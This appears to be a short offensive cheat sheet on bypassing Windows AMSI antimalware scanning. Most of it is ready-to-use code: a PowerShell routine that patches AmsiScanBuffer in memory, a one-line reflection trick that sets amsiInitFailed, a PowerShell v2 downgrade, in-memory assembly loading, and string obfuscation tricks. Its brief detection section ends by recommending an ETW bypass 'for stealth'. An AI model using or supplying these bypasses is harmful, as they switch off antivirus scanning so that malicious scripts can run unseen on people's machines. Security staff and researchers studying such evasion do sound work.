# AMSI Bypass Techniques

## How AMSI Works
AMSI (Antimalware Scan Interface) integrates with scripting engines (PowerShell, VBScript, JScript, .NET) to scan script content before execution. When a script is submitted, `AmsiScanBuffer()` is called, and the registered antivirus provider evaluates the content.

## Detection Points
- PowerShell: `System.Management.Automation.dll` → `AmsiUtils.ScanContent()`
- .NET: `AmsiScanBuffer` in `amsi.dll`
- VBS/JS: COM-based AMSI integration

## Bypass Techniques

### 1. Patch AmsiScanBuffer (PowerShell)
```powershell
$Win32 = Add-Type -memberDefinition @"
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -name "Win32" -namespace "Win32Functions" -passthru

$ptr = [Win32Functions.Win32]::GetProcAddress([Win32Functions.Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
$buf = New-Object byte[] 6
[Win32Functions.Win32]::VirtualProtect($ptr, [uint32]6, 0x40, [ref]0)
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3), 0, $ptr, 6)
```

### 2. AmsiUtils Reflection (PowerShell)
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### 3. Memory Patching (PowerShell v2 compatibility)
```powershell
# Force PowerShell v2 mode to bypass AMSI
powershell.exe -Version 2
```

### 4. .NET Assembly Load Bypass
```csharp
// Load assembly from memory bypassing disk scan
byte[] assemblyBytes = DownloadAssembly();
Assembly.Load(assemblyBytes);
```

### 5. Obfuscation Techniques
- Base64 encoding with decode at runtime
- String concatenation (`"A"+"M"+"S"+"I"`)
- Case randomization (PowerShell is case-insensitive)
- Backtick splitting: ``A`m`s`i``

## Detection Hardening
- AMSI logs to Windows Event Log: check `Microsoft-Windows-AMSI/Operational`
- EDR can monitor `AmsiScanBuffer` calls for patching attempts
- Consider combining AMSI bypass with ETW bypass for stealth
